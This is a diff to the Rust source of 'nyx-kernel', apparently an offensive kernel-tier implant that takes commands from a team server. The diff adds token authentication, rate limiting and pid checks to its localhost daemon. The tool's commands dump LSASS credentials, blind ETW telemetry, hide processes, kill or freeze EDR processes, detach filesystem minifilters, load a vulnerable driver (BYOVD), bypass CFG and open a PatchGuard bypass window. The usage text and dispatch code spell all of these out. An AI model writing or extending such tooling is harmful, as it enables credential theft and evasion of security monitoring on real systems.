@@ -20,6 +20,16 @@
 //!   nyx-kernel neutralize <pid> <freeze|choke|kill>
 //!   nyx-kernel detach-minifilter
 //!   nyx-kernel pg-window   # enter a PatchGuard unchecked window (holds until Ctrl+C)
+//!   nyx-kernel --serve <port>   # daemon mode — REQUIRES NYX_DAEMON_TOKEN (see below)
+//!   nyx-kernel --help           # full usage incl. daemon wire protocol
+//!
+//! Daemon mode (`--serve <port>`): persistent kernel session over localhost
+//! TCP. The daemon REFUSES to start without the `NYX_DAEMON_TOKEN` env var
+//! (shared secret). The FIRST line of every connection must be `auth <token>`
+//! (constant-time compare); wrong/absent token closes the connection with an
+//! error line. Ops are JSON lines `{"op":"...","pid":N}` → JSON reply
+//! lines, rate-limited per connection (60 ops/min). pid-taking ops reject
+//! pid <= 0 or absent.
 //!
 //! Build version is detected at runtime via RtlGetVersion — NO hardcoded build.
 //! All offsets come from the build table (`for_build`) or pattern scan.
@@ -41,10 +51,12 @@ fn main() {
     // ---- 1. Parse args ----
     let args: Vec<String> = std::env::args().collect();
     if args.len() < 2 {
-        eprintln!(
-            "usage: nyx-kernel <bootstrap|blind-etw|hide<pid>|dump-lsass<pid>|neutralize<pid><m>|detach-minifilter|pg-window> [...]"
-        );
+        eprintln!("usage: nyx-kernel <command> [...]   (try `nyx-kernel --help`)");
         std::process::exit(1);
+    }
+    if args.iter().any(|a| a == "--help" || a == "-h") {
+        println!("{}", usage_text());
+        std::process::exit(0);
     }
     let cmd = &args[1];
 
@@ -142,13 +154,28 @@ fn main() {
     //   {"op":"blind-etw"}               → {"ok":true}\n
     //   {"op":"hide","pid":1234}         → {"ok":true}\n
     //   {"op":"detach-minifilter"}       → {"ok":true}\n
+    // Auth: NYX_DAEMON_TOKEN is REQUIRED — the daemon refuses to start
+    // without it, and every connection must open with `auth <token>`.
     // Backward-compatible: --serve absent → normal subcommand dispatch below.
     if let Some(port_str) = args.iter().position(|a| a == "--serve").and_then(|i| args.get(i + 1)) {
-        if let Ok(port) = port_str.parse::<u16>() {
-            return run_daemon(tier, build, port);
-        }
-        eprintln!("[!] --serve needs a numeric port");
-        std::process::exit(1);
+        let port = match port_str.parse::<u16>() {
+            Ok(p) => p,
+            Err(_) => {
+                eprintln!("[!] --serve needs a numeric port");
+                std::process::exit(1);
+            }
+        };
+        // Shared secret: refuse to serve kernel ops without one.
+        let token = match std::env::var("NYX_DAEMON_TOKEN") {
+            Ok(t) if !t.is_empty() => t,
+            _ => {
+                eprintln!(
+                    "[!] --serve requires NYX_DAEMON_TOKEN (shared daemon auth secret) — refusing to start"
+                );
+                std::process::exit(7);
+            }
+        };
+        return run_daemon(tier, build, port, token);
     }
 
     // ---- 6. Dispatch the requested command ----
@@ -290,6 +317,11 @@ fn main() {
             // Win11 24H2+, TimingRepair on Win10/early Win11). The window
             // borrows tier.rw for the duration — we hold the guard until the
             // operator signals completion, then Drop repairs PG state.
+            //
+            // kernelsdk-1-1: the PG-context offsets table is PLACEHOLDER
+            // (0x190/0x08, never PDB-verified), so select_pg_window is gated
+            // OFF and currently returns None for every build. This command is
+            // expected to exit 5 until per-build PDB validation flips a row.
             eprintln!("[*] selecting PatchGuard window for build {build}...");
             let window_kind = if build >= 26100 { "RuntimePgBypass" } else { "TimingRepair" };
             match win::select_pg_window(build, &*tier.rw) {
@@ -315,7 +347,9 @@ fn main() {
                 }
                 None => {
                     eprintln!(
-                        "[!] no PatchGuard window available for build {build} (no PG-context offsets or not x86_64)"
+                        "[!] no PatchGuard window available for build {build}: PG-context offsets are \
+                         experimental placeholders (kernelsdk-1-1) and the capability is gated off — \
+                         nothing was entered, no kernel state was touched"
                     );
                     std::process::exit(5);
                 }
@@ -505,22 +539,36 @@ fn detect_build() -> u32 {
 // One bootstrap (KslD/BYOVD load + resolve_offsets pattern scan) amortised
 // across many ops. JSON line protocol on localhost — the team server's
 // /api/lsass handler (P3.c) connects as a client and posts ops.
+//
+// Auth: the daemon refuses to start without NYX_DAEMON_TOKEN. The FIRST line
+// of every connection MUST be `auth <token>`; the token is compared in
+// constant time, and wrong/absent tokens close the connection with an error
+// line. After auth, ops are rate-limited per connection (60/min).
+
+/// Maximum ops a single connection may dispatch per rolling 60s window.
+#[cfg(target_os = "windows")]
+const MAX_OPS_PER_MINUTE: usize = 60;
 
 /// Run the kernel-tier daemon: bind a localhost TCP socket, accept one
 /// connection at a time, and dispatch JSON ops against the live `tier`.
-/// Each op is a single line `{"op":"...","pid":N}`; the reply is a single
-/// line JSON `{"ok":true,...}` or `{"ok":false,"err":"..."}`.
+/// Every connection MUST open with `auth <token>` (constant-time compare
+/// against the NYX_DAEMON_TOKEN secret). After that, each op is a single
+/// line `{"op":"...","pid":N}`; the reply is a single line JSON
+/// `{"ok":true,...}` or `{"ok":false,"err":"..."}`. Ops are
+/// rate-limited per connection (MAX_OPS_PER_MINUTE).
 #[cfg(target_os = "windows")]
 fn run_daemon(
     tier: nyx_operator_kernelsdk::KernelTier,
     build: u32,
     port: u16,
+    token: String,
 ) -> ! {
     use nyx_operator_kernelsdk::{
         CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit, ProcHideKit,
     };
     use std::io::{BufRead, BufReader, Write};
     use std::net::TcpListener;
+    use std::time::{Duration, Instant};
 
     let bind = format!("127.0.0.1:{port}");
     let listener = match TcpListener::bind(&bind) {
@@ -546,9 +594,30 @@ fn run_daemon(
             .peer_addr()
             .map(|a| a.to_string())
             .unwrap_or_else(|_| "?".into());
-        eprintln!("[*] daemon: client {peer} connected");
+
+        // ---- Token challenge: the FIRST line must be `auth <token>`. ----
+        // Bound the auth wait so a client that connects and never sends a
+        // token cannot wedge the single-connection daemon.
+        let _ = stream.set_read_timeout(Some(Duration::from_secs(10)));
         let reader = BufReader::new(stream.try_clone().expect("clone stream"));
-        for line in reader.lines() {
+        let mut lines = reader.lines();
+        let authed = match lines.next() {
+            Some(Ok(line)) => check_auth(line.trim(), &token),
+            _ => false,
+        };
+        if !authed {
+            eprintln!("[*] daemon: {peer} auth failed — closing");
+            let _ = stream.write_all(b"{\"ok\":false,\"err\":\"auth failed\"}\n");
+            continue;
+        }
+        // Auth done; lift the read timeout (authenticated sessions may be
+        // long-lived — the team server holds the connection between ops).
+        let _ = stream.set_read_timeout(None);
+        eprintln!("[*] daemon: client {peer} authenticated");
+
+        // ---- Per-connection op loop with rate limiting (60 ops/min). ----
+        let mut op_times: Vec<Instant> = Vec::new();
+        for line in lines {
             let line = match line {
                 Ok(l) => l,
                 Err(_) => break,
@@ -557,7 +626,14 @@ fn run_daemon(
             if trimmed.is_empty() {
                 continue;
             }
-            let reply = dispatch_daemon_op(trimmed, &tier, build);
+            let now = Instant::now();
+            op_times.retain(|t| now.duration_since(*t) < Duration::from_secs(60));
+            let reply = if op_times.len() >= MAX_OPS_PER_MINUTE {
+                json_err("rate limit exceeded (60 ops/min per connection)")
+            } else {
+                op_times.push(now);
+                dispatch_daemon_op(trimmed, &tier, build)
+            };
             let reply_line = format!("{reply}\n");
             if stream.write_all(reply_line.as_bytes()).is_err() {
                 break;
@@ -572,6 +648,7 @@ fn run_daemon(
 
 /// Dispatch one daemon op. Tiny hand-rolled JSON parser (no serde dep) — we
 /// only recognise `op` (string) and `pid` (number). Returns a JSON reply line.
+/// pid-taking ops (`dump-lsass`, `hide`) reject pid <= 0 or absent.
 #[cfg(target_os = "windows")]
 fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, build: u32) -> String {
     use nyx_operator_kernelsdk::{
@@ -579,10 +656,15 @@ fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, bui
     };
 
     let op = json_string_field(line, "op").unwrap_or_default();
-    let pid = json_number_field(line, "pid").unwrap_or(0);
+    // Keep the raw Option so we can distinguish `"pid":0` / absent from a
+    // well-formed positive pid.
+    let pid_opt = json_number_field(line, "pid");
 
     match op.as_str() {
         "dump-lsass" => {
+            let Some(pid) = pid_opt.filter(|p| *p > 0) else {
+                return json_err("dump-lsass requires pid > 0");
+            };
             if let Some(cred) = &tier.cred {
                 match cred.dump_lsass_with_base(&*tier.rw, pid) {
                     Ok((bytes, base_va)) => {
@@ -618,6 +700,9 @@ fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, bui
             }
         }
         "hide" => {
+            let Some(pid) = pid_opt.filter(|p| *p > 0) else {
+                return json_err("hide requires pid > 0");
+            };
             if let Some(hide) = &tier.hide {
                 match hide.hide(&*tier.rw, pid) {
                     Ok(()) => json_ok(),
@@ -652,7 +737,7 @@ fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, bui
 }
 
 /// Extract a JSON string field value `"key":"value"` → `value`. Tiny hand-rolled
-/// parser — avoids a serde dependency for the daemon's 4-op protocol.
+/// parser — avoids a serde dependency for the daemon's JSON-line protocol.
 #[cfg(target_os = "windows")]
 fn json_string_field(line: &str, key: &str) -> Option<String> {
     let needle = format!("\"{key}\":\"");
@@ -684,6 +769,72 @@ fn json_err(msg: &str) -> String {
     // Escape any embedded quotes in the message.
     let escaped: String = msg.replace('\\', "\\\\").replace('"', "\\\"");
     format!(r#"{{"ok":false,"err":"{escaped}"}}"#)
+}
+
+/// Constant-time byte comparison (hand-rolled — no `subtle` dep). Never
+/// short-circuits on the first differing byte; a length mismatch is folded
+/// into the accumulator so timing leaks nothing about the secret's content.
+#[cfg(target_os = "windows")]
+fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
+    let mut diff = a.len() ^ b.len();
+    let max = a.len().max(b.len());
+    let mut i = 0;
+    while i < max {
+        let x = a.get(i).copied().unwrap_or(0);
+        let y = b.get(i).copied().unwrap_or(0);
+        diff |= (x ^ y) as usize;
+        i += 1;
+    }
+    diff == 0
+}
+
+/// Parse and verify the first-line token challenge (`auth <token>`). The
+/// token is compared in constant time; anything else (absent/malformed/wrong)
+/// fails.
+#[cfg(target_os = "windows")]
+fn check_auth(line: &str, token: &str) -> bool {
+    let line = line.trim();
+    let Some(rest) = line.strip_prefix("auth ") else {
+        return false;
+    };
+    let rest = rest.trim_start();
+    !rest.is_empty() && constant_time_eq(rest.as_bytes(), token.as_bytes())
+}
+
+/// Extended usage text, including daemon mode auth requirements.
+#[cfg(target_os = "windows")]
+fn usage_text() -> &'static str {
+    r#"usage: nyx-kernel <command> [args...]
+
+Commands:
+  bootstrap [--byovd <sys> <svc>] [--flt-rva <hex>]
+  blind-etw
+  hide <pid>
+  dump-lsass <pid>
+  neutralize <pid> <freeze|choke|kill>
+  detach-minifilter
+  pg-window                # PatchGuard unchecked window (holds until Ctrl+C)
+  cfg-bypass               # mark NtContinue as a valid CFG call target
+  forge-etw [<parent> <child> <image> [out.bin]]
+  --serve <port>           # daemon mode (see below)
+  --help                   # this text
+
+Daemon mode (--serve <port>):
+  Persistent kernel session over 127.0.0.1:<port> (one bootstrap amortised
+  across ops; one connection served at a time). The daemon REFUSES to start
+  without the NYX_DAEMON_TOKEN environment variable (shared secret).
+
+  Wire protocol (JSON lines; first line of EVERY connection):
+    auth <token>                           -> {"ok":true} (else error + close)
+    {"op":"dump-lsass","pid":684}         -> {"ok":true,"out_file":"lsass_684.dmp","bytes":N,"base_va":"0x..."}
+    {"op":"blind-etw"}                    -> {"ok":true}
+    {"op":"hide","pid":1234}             -> {"ok":true}
+    {"op":"detach-minifilter"}            -> {"ok":true}
+    {"op":"status"}                       -> {"ok":true,"build":N,...}
+
+  Wrong/absent token closes the connection with an error line. pid-taking
+  ops reject pid <= 0 or absent. Ops are rate-limited per connection
+  (60/min)."#
 }
 
 // ---- Helpers ----
